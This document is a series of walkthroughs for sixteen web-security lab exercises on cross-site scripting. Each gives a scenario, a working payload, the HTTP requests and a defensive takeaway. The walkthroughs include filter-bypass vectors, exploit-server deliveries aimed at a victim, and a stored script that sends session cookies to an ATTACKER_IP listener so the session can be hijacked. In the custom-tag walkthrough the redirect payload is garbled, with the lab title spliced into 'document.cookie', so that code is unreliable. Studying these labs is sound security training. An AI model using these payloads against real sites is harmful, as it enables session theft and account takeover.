### [PS-XSS-01] Reflected XSS into HTML context with nothing encoded

**Scenario:** The application's search function accepts user input via a URL query parameter and reflects it directly into the HTML response body without any sanitization or output encoding, allowing an attacker to execute arbitrary JavaScript in the victim's browser.

**Solution:**

1. Input a standard XSS payload into the search box on the home page and submit the search query.
2. Intercept or view the resulting HTTP request in Burp Repeater:

```http
GET /?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: target.web-security-academy.net

```

3. Inspect the server's HTML response to confirm that the input is reflected raw inside the body context:

```html
<h1>0 search results for '<script>alert(1)</script>'</h1>

```

4. Render the page in a browser to confirm that the script executes and triggers the `alert(1)` pop-up.

> **Key Takeaway:** Reflected XSS in HTML context occurs when untrusted user input is echoed directly into the HTML response stream without context-aware output encoding. All user-supplied data reflected in HTML must undergo context-appropriate encoding (such as converting `<` to `&lt;` and `>` to `&gt;`).

---

### [PS-XSS-02] Stored XSS into HTML context with nothing encoded

**Scenario:** The application's blog comment functionality stores user input directly in a database and renders it into the HTML body context when the blog post is viewed. Because no sanitization or output encoding is performed, the injected script persists on the server and automatically executes in the browser of anyone who views the comment.

**Solution:**

1. Navigate to any blog post on the target site.
2. Scroll to the **Leave a comment** section at the bottom of the page.
3. Enter an XSS payload in the **Comment** text area:

```html
<script>alert(1)</script>

```

4. Fill in the required **Name**, **Email**, and **Website** fields with arbitrary values.
5. Click **Post comment**.
6. Click **Back to blog** or reload the blog post page. The application fetches the stored comment from the database and executes the script, triggering the `alert(1)` pop-up.

> **Key Takeaway:** Stored (persistent) XSS is self-contained within the web application and executes automatically whenever a victim encounters the stored data. All user-controlled input stored in persistent storage must undergo strict context-appropriate encoding (such as HTML entity encoding) before being rendered back to users.

---

### [PS-XSS-03] DOM XSS in document.write sink using source location.search

**Scenario:** The application contains a DOM-based cross-site scripting vulnerability in its search functionality. Client-side JavaScript retrieves data from an untrusted source (`location.search`) and passes it directly into a dangerous sink (`document.write`) without sanitization or escaping.

**Solution:**

1. Enter an arbitrary search string (e.g., `test`) in the search box on the home page.
2. Open Browser Developer Tools (F12) or inspect the page source to analyze how the search query is handled client-side.
3. Locate the inline script executing the search tracking logic:

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    trackSearch(query);
}

```

4. Observe that `query` is taken directly from the `search` parameter in `location.search` and interpolated inside an `<img>` tag written via `document.write()`.
5. Craft a payload to break out of the `src` attribute and `<img>` tag, then execute arbitrary JavaScript:

```html
"><script>alert(1)</script>

```

6. Submit the payload in the search box or append it to the query string in the browser address bar:

```http
GET /?search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: target.web-security-academy.net

```

7. When the script evaluates, `document.write()` outputs `<img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>">`, triggering the `alert(1)` pop-up.

> **Key Takeaway:** DOM XSS occurs entirely within the client-side browser environment when untrusted attacker-controlled sources (such as `location.search`, `location.hash`, or `document.referrer`) reach execution sinks like `document.write()`, `innerHTML`, or `eval()`. Safe development practices require avoiding dynamic code evaluation sinks and utilizing safer DOM manipulation methods such as `textContent` or `createElement()`.

---

### [PS-XSS-04] DOM XSS in innerHTML sink using source location.search

**Scenario:** The application processes user-supplied search queries client-side by assigning data retrieved from `location.search` directly into an `innerHTML` sink. Because `innerHTML` does not execute `<script>` tags in modern browsers (per HTML5 spec), an attacker must use an element with an inline event handler (such as `<img src=x onerror=alert(1)>`) to achieve code execution.

**Solution:**

1. Submit an arbitrary search query (e.g., `test`) on the blog page.
2. Open Browser Developer Tools (F12) and inspect the search results element to analyze the client-side JavaScript:

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    doSearchQuery(query);
}

```

3. Note that `query` is taken directly from the URL's `search` parameter (`location.search`) and written to the DOM via `.innerHTML`.
4. Craft an XSS payload using an `<img>` tag with an invalid `src` and an `onerror` event handler:

```html
<img src=x onerror=alert(1)>

```

5. Submit the payload into the search box or append it directly to the URL query string:

```http
GET /?search=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E HTTP/1.1
Host: target.web-security-academy.net

```

6. The JavaScript assigns the payload to `innerHTML`, inserting the `<img>` element into the page. When the browser attempts to load image source `x`, it fails and fires the `onerror` event, triggering the `alert(1)` pop-up.

> **Key Takeaway:** Assigning untrusted input to an `innerHTML` sink allows DOM XSS. Even though modern browsers block standard `<script>` tag execution when inserted via `innerHTML`, attackers easily bypass this by leveraging inline event handlers like `onerror` or `onload`. Use safer properties like `textContent` or `innerText` to safely render user text.

---

### [PS-XSS-05] DOM XSS in jQuery anchor href attribute sink using location.search

**Scenario:** The application uses jQuery to dynamically populate the `href` attribute of a back link on the feedback page using a query parameter (`returnPath`) extracted directly from `location.search`. Because the URL scheme is not validated, an attacker can pass a `javascript:` pseudo-protocol URL into the parameter, causing arbitrary code to execute when a user clicks the link.

**Solution:**

1. Navigate to the **Submit feedback** page on the target site.
2. Open Browser Developer Tools (F12) and inspect the page source code handling the back link:

```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});

```

3. Observe that jQuery's `.attr("href", ...)` function assigns the `returnPath` parameter from `location.search` directly to the `href` attribute of the element with ID `backLink`.
4. Construct an XSS payload leveraging the `javascript:` URI scheme:

```text
javascript:alert(1)

```

5. Append the payload to the `returnPath` parameter in the browser address bar:

```http
GET /feedback?returnPath=javascript:alert(1) HTTP/1.1
Host: target.web-security-academy.net

```

6. Inspect the generated anchor tag in the DOM to confirm its update:

```html
<a id="backLink" href="javascript:alert(1)">Back</a>

```

7. Click the **Back** link on the page. The browser executes the inline JavaScript protocol, triggering the `alert(1)` pop-up.

> **Key Takeaway:** Assigning untrusted user input directly to URL-accepting attributes (`href`, `src`, `action`) creates DOM XSS risks via the `javascript:` pseudo-protocol. To mitigate this, client-side code must enforce strict URL validation—ensuring links start with explicit, safe schemes (`https://`, `http://`) or relative path slashes (`/`) before dynamically inserting them into the DOM.

---

### [PS-XSS-06] DOM XSS in jQuery selector sink using a hashchange event

**Scenario:** The application uses a vulnerable pattern where the jQuery selector function `$()` acts as a DOM execution sink. An event listener bound to the `hashchange` event reads user input from `location.hash` and passes it directly into `$()`. When an attacker delivers a payload via a crafted URL or iframe, jQuery interprets the payload string as HTML elements rather than a CSS selector, executing arbitrary JavaScript.

**Solution:**

1. Open Browser Developer Tools (F12) or view the home page source code to locate the `hashchange` event handler:

```javascript
$(window).on('hashchange', function() {
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post.length) {
        post[0].scrollIntoView();
    }
});

```

2. Observe that `window.location.hash` is decoded and concatenated inside the `$()` selector function. In vulnerable jQuery implementations, passing HTML tags into `$()` causes jQuery to instantiate those DOM elements and execute inline scripts or handlers.
3. Access the lab's **Exploit Server**.
4. In the **Body** text area of the exploit server, craft an `<iframe>` payload that loads the vulnerable site home page and then updates the `src` attribute hash to trigger the `hashchange` event:

```html
<iframe src="https://target.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

```

5. Click **Store** and then **Deliver exploit to victim**.
6. When the victim visits the link, the `<iframe>` initially loads the target URL with an empty hash `#`. Once loaded, the `onload` handler appends `<img src=x onerror=print()>` to `this.src`, firing the `hashchange` event. jQuery receives the image payload in `$()`, causing the browser to render the broken image tag and execute `print()`.

> **Key Takeaway:** Passing untrusted user input (such as `location.hash`) into jQuery's `$()` selector function is dangerous because jQuery attempts to parse strings starting with `<` as HTML DOM elements rather than CSS query selectors. Input passed to selectors must be sanitized, strictly validated, or handled using specific DOM selection methods like `Element.querySelector()` rather than overloaded library wrappers.

---

### [PS-XSS-07] Reflected XSS into attribute with angle brackets HTML-encoded

**Scenario:** The application reflects user search queries inside the `value` attribute of an HTML `<input>` tag. While the application HTML-encodes angle brackets (`<` and `>`) to prevent tag creation, it fails to encode double quotes (`"`). This allows an attacker to break out of the attribute string and inject new HTML attributes, such as an event handler (`onfocus`) combined with `autofocus` to execute JavaScript without user interaction.

**Solution:**

1. Enter an arbitrary search string (e.g., `test`) in the search box on the home page.
2. Inspect the search input element in Browser Developer Tools (F12) to observe how input reflects:

```html
<input type="text" name="search" value="test">

```

3. Test if double quotes are preserved by searching for `"test`. Inspecting the page DOM confirms the quote is rendered unescaped inside the tag:

```html
<input type="text" name="search" value=""test">

```

4. Craft an XSS payload that closes the `value` attribute and introduces an event handler along with `autofocus` to execute code automatically upon page load:

```html
" onfocus="alert(1)" autofocus="

```

5. Submit the payload in the search field or append it to the query parameter:

```http
GET /?search=%22+onfocus%3D%22alert%281%29%22+autofocus%3D%22 HTTP/1.1
Host: target.web-security-academy.net

```

6. Inspect the resulting HTML markup rendered by the server:

```html
<input type="text" name="search" value="" onfocus="alert(1)" autofocus="">

```

7. When the page loads, `autofocus` automatically places cursor focus on the `<input>` element, triggering `onfocus` and executing `alert(1)`.

> **Key Takeaway:** Sanitization must be context-aware. When reflecting user input inside HTML attributes, encoding angle brackets is ineffective against attribute breakout. Attribute values must have quotes HTML-encoded (e.g., `"` converted to `&quot;` and `'` to `&#x27;`) to prevent attackers from introducing new attributes or event handlers.

---

### [PS-XSS-08] Stored XSS into anchor href attribute with double quotes HTML-encoded

**Scenario:** The application allows users to submit comments with a website URL, which is stored in the database and rendered inside the `href` attribute of an `<a>` tag wrapping the commenter's name. The application HTML-encodes double quotes (`"`), preventing an attacker from breaking out of the attribute. However, because the value is directly inserted into a URL context, an attacker can leverage the `javascript:` pseudo-protocol without needing quotes or angle brackets.

**Solution:**

1. Navigate to any blog post on the target site and locate the **Leave a comment** form.
2. Fill in the **Comment**, **Name**, and **Email** fields with arbitrary test data.
3. In the **Website** field, input the following URI payload:

```text
javascript:alert(1)

```

4. Click **Post comment** and return to the blog post.
5. Inspect the comment author's link in Browser Developer Tools (F12) to verify how the payload was rendered:

```html
<a id="author" href="javascript:alert(1)">Commenter Name</a>

```

6. Click the author's name link. The browser evaluates the `javascript:` pseudo-protocol, executing the script and triggering the `alert(1)` pop-up.

> **Key Takeaway:** Encoding double quotes (`&quot;`) prevents attribute breakout, but it fails to secure URL-accepting attributes like `href` or `src`. To prevent XSS in URL contexts, applications must validate that user-supplied input uses safe schemes (`http://`, `https://`) or relative path slashes (`/`) before rendering them into the DOM.

---

### [PS-XSS-09] Reflected XSS into a JavaScript string with angle brackets HTML-encoded

**Scenario:** The application reflects the user's search query directly inside a JavaScript string literal within an inline `<script>` tag. Although angle brackets (`<` and `>`) are HTML-encoded by the server—preventing an attacker from closing the `<script>` tag—single quotes (`'`) are left unescaped. This allows an attacker to terminate the string literal, introduce custom JavaScript commands, and execute arbitrary code.

**Solution:**

1. Perform a search for an arbitrary string (e.g., `test`) on the home page.
2. View the page source or inspect the HTTP response in Burp Repeater to locate where the search term reflects inside an inline `<script>` block:

```javascript
<script>
    var searchTerms = 'test';
</script>

```

3. Craft an XSS payload using a single quote (`'`) to terminate the string, a semicolon (`;`) to end the assignment statement, the payload function, and line comment markers (`//`) to neutralize the trailing single quote:

```javascript
';alert(1)//

```

4. Submit the payload via the search field or query parameter:

```http
GET /?search=%27%3Balert%281%29%2F%2F HTTP/1.1
Host: target.web-security-academy.net

```

5. Inspect the server's HTML response to confirm how the script parses:

```javascript
<script>
    var searchTerms = '';alert(1)//';
</script>

```

6. Render the page in the browser. The JavaScript engine closes the `searchTerms` variable assignment, executes `alert(1)`, and ignores the remainder of the original statement due to the comment (`//`).

> **Key Takeaway:** Standard HTML entity encoding (such as converting `<` to `&lt;`) provides zero protection when user input reflects inside a JavaScript context. To safely handle dynamic values inside scripts, applications must use JavaScript-specific escaping (e.g., Unicode escaping like `\x27` for quotes), serialize data using JSON, or pass data via HTML `data-*` attributes rather than direct script interpolation.

---

### [PS-XSS-10] Reflected XSS into a JavaScript string with single quote and backslash escaped

**Scenario:** The application reflects user input inside a JavaScript string literal within an inline `<script>` block. The server escapes both single quotes (`'`) and backslashes (`\`), preventing attackers from terminating the string or escaping the quote handler. However, because the reflection occurs directly within inline HTML `<script>` tags, the browser's HTML parser processes tag boundaries before the JavaScript engine executes the code. An attacker can close the entire script element using `</script>` and inject a new HTML/JavaScript context.

**Solution:**

1. Submit a search query with test characters (e.g., `test'\"`) on the home page.
2. View the page source or inspect the response in Burp Repeater to observe how single quotes and backslashes are escaped:

```javascript
<script>
    var searchTerms = 'test\'\\\"';
</script>

```

3. Craft an XSS payload that ignores the JavaScript string syntax completely and targets the HTML element boundary by closing the inline `<script>` tag:

```html
</script><script>alert(1)</script>

```

4. Submit the payload via the search field or query parameter:

```http
GET /?search=%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: target.web-security-academy.net

```

5. Inspect the server's HTML response to confirm how the browser receives the markup:

```html
<script>
    var searchTerms = '</script><script>alert(1)</script>';
</script>

```

6. Render the page in the browser. The HTML parser encounters `</script>` inside the string literal, immediately terminates the first script element, and then parses and executes the subsequent `<script>alert(1)</script>` block.

> **Key Takeaway:** HTML parsing takes precedence over JavaScript parsing for inline script blocks. Escaping JavaScript-specific characters (like quotes and backslashes) is ineffective if an attacker can introduce HTML tag delimiters. To remediate this, applications must HTML-encode angle brackets (`<` and `>`) when reflecting input inside inline script tags, or ideally load dynamic values via dedicated data attributes or JSON APIs.

---

### [PS-XSS-11] Reflected XSS into HTML context with most tags and attributes blocked

**Scenario:** The application attempts to prevent XSS by utilizing a Web Application Firewall (WAF) or filter that blacklists standard HTML tags and attributes. However, by systematically fuzzing the filter, an attacker can identify unblocked HTML tags (`<body>`) and event handlers (`onresize`). Because the victim's browser must be forced to resize to fire the event automatically, the exploit is delivered via an `<iframe>` hosted on the exploit server.

**Solution:**

1. Intercept a search request on the target home page using Burp Suite and send it to **Burp Intruder**.
2. Replace the search parameter value with a tag payload position:

```http
GET /?search=<%24tag%24> HTTP/1.1
Host: target.web-security-academy.net

```

3. Load a list of standard HTML tags (from the PortSwigger XSS cheat sheet) into Intruder and start the attack. Observe that the server returns `200 OK` for `<body>` while blocking most other tags with a `400` or `403` status.
4. Update the Intruder position to fuzz event handlers on the `<body>` tag:

```http
GET /?search=%3Cbody+%24event%24%3D1%3E HTTP/1.1

```

5. Load a list of event handlers into Intruder and run the attack. Note that `onresize` returns `200 OK`.
6. Access the lab's **Exploit Server** and paste the following payload into the **Body** section, which loads the target with the payload and resizes the frame immediately:

```html
<iframe src="https://target.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width='100px'"></iframe>

```

7. Click **Store** and **Deliver exploit to victim**. When the victim visits the page, the `<iframe>` loads the search response containing `<body onresize=print()>` and its `onload` attribute alters the frame width, triggering `onresize` and calling `print()`.

> **Key Takeaway:** Blacklisting tags and event handlers is fundamentally insecure because web standards support hundreds of tag and attribute combinations. Attackers can easily bypass WAF filters by automated fuzzing. Applications must enforce strict context-aware output encoding or use strong Content Security Policies (CSP) rather than relying on input blacklists.

---

### [PS-XSS-12] Reflected XSS into HTML context with all tags blocked except custom ones

**Scenario:** The application uses a WAF or input filter that blocks all standard, known HTML tags (e.g., `script`, `img`, `body`, `svg`). However, modern browser specs allow custom HTML elements (such as `<xss>`) which are not present in standard WAF blocklists. By defining a custom tag with an `id` attribute, `tabindex`, and an `onfocus` event handler, an attacker can deliver an exploit that automatically focuses the element via URL hash navigation (`#id`) to trigger JavaScript execution.

**Solution:**

1. Intercept a search request in Burp Suite and send it to **Burp Intruder**.
2. Fuzz standard tags vs. arbitrary strings in the search parameter. Observe that all standard HTML tags return a `400 Bad Request` or `403 Forbidden`, while custom tag names like `<xss>` return `200 OK`.
3. Construct a custom tag payload containing an `onfocus` handler, an `id` attribute, and `tabindex="1"` to make the custom tag focusable:

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>

```

4. Access the lab's **Exploit Server**.
5. In the **Body** text area, write a script that redirects the victim's browser to the target site with the custom tag payload in the search parameter, appending the `#x` hash to force immediate focus on element `id="x"`:

```html
<script>
location = 'https://target.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cooReflected XSS into HTML context with all tags blocked except custom oneskie%29+tabindex%3D1%3E#x';
</script>

```

6. Click **Store** and **Deliver exploit to victim**.
7. When the victim visits the exploit page, the script forces navigation to the target URL. The browser parses the custom `<xss>` element, reads the `#x` anchor, focuses the element automatically, and triggers the `onfocus` handler to execute `alert(document.cookie)`.

> **Key Takeaway:** Relying on tag blocklists for XSS protection is ineffective because HTML parsers allow unrecognised or custom tags to exist in the DOM. Custom elements inherit standard HTML event attributes (`onfocus`) and accessibility properties (`tabindex`), allowing attackers to create fully functional execution vectors outside traditional tag filters.

---

### [PS-XSS-13] Reflected XSS with event handlers and href attributes blocked

**Scenario:** The application employs a Web Application Firewall (WAF) that blocks all standard JavaScript event handlers (`onload`, `onerror`, `onclick`, etc.) and prevents direct `href` attributes on elements. However, the WAF allows SVG container elements, anchor tags (`<a>`), and SVG animation tags (`<animate>`). An attacker can bypass the attribute filter by leveraging the `<animate>` tag to dynamically write a `javascript:` payload into the parent `<a>` element's `href` attribute at runtime.

**Solution:**

1. Submit a search query on the target home page and observe how the input reflects in the HTML response.
2. Intercept the request in Burp Suite and verify through Burp Intruder or manual testing that standard event handlers (e.g., `onload`) and direct `href` attributes are blocked with a `400` or `403` status.
3. Observe that `<svg>`, `<a>`, and `<animate>` tags are permitted.
4. Construct an SVG payload that uses the `<animate>` element to set the `attributeName` property to `href` and populate its value with the `javascript:` pseudo-protocol:

```html
<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text x="20" y="20">Click me</text></a></svg>

```

5. Submit the URL-encoded payload via the search parameter:

```http
GET /?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3D%22href%22+values%3D%22javascript%3Aalert%281%29%22+%2F%3E%3Ctext+x%3D%2220%22+y%3D%2220%22%3EClick+me%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E HTTP/1.1
Host: target.web-security-academy.net

```

6. Render the page in the browser and click the "Click me" text. The `<animate>` tag dynamically injects `href="javascript:alert(1)"` into the anchor tag, executing `alert(1)` upon interaction.

> **Key Takeaway:** Restricting direct attribute names (like `href`) or event handlers is ineffective if SVG elements are allowed. SVG animation tags (`<animate>`, `<set>`) can dynamically mutate DOM attributes at runtime, bypassing static attribute filters. To mitigate XSS, applications must perform strict output encoding or implement a robust Content Security Policy (CSP) instead of relying on attribute blocklists.

---

### [PS-XSS-14] Reflected XSS with some SVG markup allowed

**Scenario:** The application reflects user input inside an HTML response and relies on a Web Application Firewall (WAF) to filter standard XSS tags and event handlers. However, the blocklist fails to cover the entire SVG specification, leaving specific SVG elements (`<svg>`, `<animatetransform>`, `<image>`, `<title>`) and SVG-specific animation event handlers (`onbegin`) permitted. An attacker can nest an `<animatetransform>` element inside an `<svg>` wrapper to execute arbitrary JavaScript automatically when the animation starts.

**Solution:**

1. Submit a search query on the target home page and intercept the HTTP request in Burp Suite.
2. Send the request to **Burp Intruder** and highlight the search parameter value as a payload position:

```http
GET /?search=<%24tag%24> HTTP/1.1
Host: target.web-security-academy.net

```

3. Load a list of HTML/SVG tags into Intruder and run the attack. Observe that `<svg>`, `<animatetransform>`, `<image>`, and `<title>` return a `200 OK` response while most other tags return `400` or `403`.
4. Configure Intruder to fuzz event handlers on the permitted `<animatetransform>` tag:

```http
GET /?search=%3Csvg%3E%3Canimatetransform+%24event%24%3D1%3E HTTP/1.1

```

5. Run the attack with a list of event handlers. Note that `onbegin` returns `200 OK`.
6. Construct the final XSS payload:

```html
<svg><animatetransform onbegin=alert(1)></svg>

```

7. Submit the URL-encoded payload in the search query parameter:

```http
GET /?search=%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29%3E HTTP/1.1
Host: target.web-security-academy.net

```

8. View the page in the browser. The SVG engine initializes the `<animatetransform>` element and fires the `onbegin` event immediately, executing `alert(1)`.

> **Key Takeaway:** The SVG vector space contains numerous niche elements and non-standard event handlers (such as `onbegin`, `onend`, and `onrepeat`) that easily bypass WAF blocklists focused solely on traditional HTML elements (`<script>`, `<img>`, `onload`). Complete protection against reflected XSS requires robust context-aware output encoding or a strict Content Security Policy (CSP) rather than incomplete tag blacklists.

---

### [PS-XSS-15] Reflected XSS in canonical link tag

**Scenario:** The application dynamically reflects URL path parameters or query strings into the `href` attribute of a `<link rel="canonical">` element within the page `<head>`. Although elements inside `<head>` are rendered invisibly by the browser and cannot be clicked directly, single quotes (`'`) are left unescaped. This allows an attacker to break out of the `href` attribute and inject `accesskey` and `onclick` attributes, enabling payload execution via keyboard shortcut interaction.

**Solution:**

1. Access the target home page and inspect the source code inside the `<head>` section to locate the canonical link element:

```html
<link rel="canonical" href="https://target.web-security-academy.net/" />

```

2. Append query parameters containing single quotes to test whether input reflects unescaped inside the `href` attribute:

```text
/?'accesskey='x'onclick='alert(1)

```

3. Submit the request containing the payload:

```http
GET /?'accesskey='x'onclick='alert(1) HTTP/1.1
Host: target.web-security-academy.net

```

4. Inspect the rendered HTML response to verify attribute breakout:

```html
<link rel="canonical" href="https://target.web-security-academy.net/?' accesskey='x' onclick='alert(1)' />

```

5. Trigger the payload by pressing the keyboard shortcut assigned to `accesskey="x"` anywhere on the page:
* **Windows / Linux:** `Alt` + `Shift` + `X`
* **macOS:** `Control` + `Option` + `X`


6. The browser programmatically dispatches a click event to the canonical link element, executing the `onclick` handler and triggering `alert(1)`.

> **Key Takeaway:** Dynamically constructing HTML attributes from raw request URIs without context-aware attribute encoding enables attribute injection attacks. Furthermore, invisible elements in the DOM (such as `<link>` or `<meta>` tags in `<head>`) can still serve as XSS vectors when combined with input-focused attributes like `accesskey`.

---

### [PS-XSS-16] Exploiting cross-site scripting to steal cookies (Non-Collaborator Solution)

**Scenario:** The application contains a stored XSS vulnerability in the blog comments function. When a user posts a comment, it is rendered unsanitized to all subsequent visitors—including a simulated victim/admin user. Because the application does not set the `HttpOnly` flag on session cookies, an attacker can post a script payload that reads `document.cookie` and exfiltrates it to an attacker-controlled HTTP listener (such as a local Python server or Netcat instance on an internal exam/VPN network) to perform session hijacking.

**Solution:**

1. Open a terminal on your attacking machine (e.g., Kali Linux) and start a lightweight HTTP server on an accessible port:

```bash
python3 -m http.server 8080

```

2. Navigate to a blog post on the target application and submit a comment containing an asynchronous image-based exfiltration payload. Replace `ATTACKER_IP` with your machine's VPN/network IP:

```html
<script>
new Image().src = 'http://ATTACKER_IP:8080/?cookie=' + encodeURIComponent(document.cookie);
</script>

```

3. Submit the comment. When the victim user views the comment section, their browser executes the script, instantiates an HTTP request, and sends their session cookie to your server.
4. Check your terminal logs for the incoming `GET` request containing the victim's session token in the query string:

```text
10.10.x.x - - [24/Aug/2026 18:47:00] "GET /?cookie=secret_session_token_12345 HTTP/1.1" 200 -

```

5. Intercept any request to the target site using Burp Suite (or open Browser DevTools -> Application -> Cookies).
6. Replace your `session` cookie value with the stolen `secret_session_token_12345` token.
7. Refresh or navigate to `/my-account` to confirm successful session hijacking under the victim's identity.

> **Key Takeaway:** Stored XSS combined with accessible `document.cookie` values allows complete session hijacking. The primary defense is enforcing the `HttpOnly` attribute on all sensitive session cookies to block JavaScript DOM access, combined with strict output encoding and a Content Security Policy (CSP) restricting outbound connection destinations (`connect-src` / `img-src`).